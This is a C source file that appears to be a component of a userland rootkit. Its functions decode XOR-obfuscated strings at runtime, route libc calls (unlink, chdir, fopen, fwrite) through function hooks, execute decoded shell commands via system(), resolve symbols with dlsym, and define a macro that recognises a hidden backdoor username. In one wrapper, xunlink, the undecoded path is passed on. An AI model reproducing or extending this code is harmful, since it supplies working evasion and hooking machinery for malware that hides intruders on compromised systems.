/* all of these wrappers are intended solely to increase
 * efficiency when it comes to using the strings that are
 * xor'd during the configuration stage.
 * instead of calling xor() 5000 times in one function,
 * just make wrappers for em. */

//int xsnprintf(char *str, size_t size, const char *format, ...);
//int xvsnprintf(char *str, size_t size, const char *format, va_list ap);

size_t xstrlen(const char *str){
    size_t len = 0;
    xor(_str, str);
    len = strlen(_str);
    clean(_str);
    return len;
}

int xunlink(const char *pathname){
    int ret;
    hook(CUNLINK);
    xor(_pathname, pathname);
    ret = (long)call(CUNLINK, pathname);
    clean(_pathname);
    return ret;
}

char *_xcrypt(const char *key, const char *salt){
    char *ret;
    xor(_salt, salt);
    ret = crypt(key, _salt);
    clean(_salt);
    return ret;
}

int xsystem(const char *command){
    int ret;
    xor(_command, command);
    ret = system(_command);
    clean(_command);
    return ret;
}

int xchdir(const char *path){
    int ret;
    hook(CCHDIR);
    xor(_path, path);
    ret = (long)call(CCHDIR, _path);
    clean(_path);
    return ret;
}

void *xdlsym(void *handle, const char *symbol){
    void *ptr = NULL;
    xor(_symbol, symbol);
    ptr = dlsym(handle, _symbol);
    clean(_symbol);
    return ptr;
}

FILE *xfopen(const char *path, const char *mode){
    FILE *ret;
    hook(CFOPEN);
    xor(_path, path);
    ret = call(CFOPEN, _path, mode);
    clean(_path);
    return ret;
}

size_t xfwrite(const char *str, size_t nmemb, FILE *stream){
    size_t ret;
    hook(CFWRITE);
    xor(_str, str);
    ret = (size_t)call(CFWRITE, _str, strlen(_str), nmemb, stream);
    clean(_str);
    return ret;
}

int _xprintf(const char *string){
    int ret;
    xor(_string, string);
    ret = printf("%s\n", _string);
    clean(_string);
    return ret;
}

int xstrncmp(const char *pattern, const char *string){
    int ret;
    xor(_pattern, pattern);
    ret = strncmp(_pattern, string, strlen(string));
    clean(_pattern);
    return ret;
}
#define isbduname(name) !xstrncmp(BD_UNAME, name)

char *xstrstr(const char *pattern, const char *string){
    char *ret;
    xor(_pattern, pattern);
    ret = strstr(_pattern, string);
    clean(_pattern);
    return ret;
}

int xfnmatch(const char *pattern, const char *string){
    int ret;
    xor(_pattern, pattern);
    ret = fnmatch(_pattern, string, FNM_PATHNAME);
    clean(_pattern);
    return ret;
}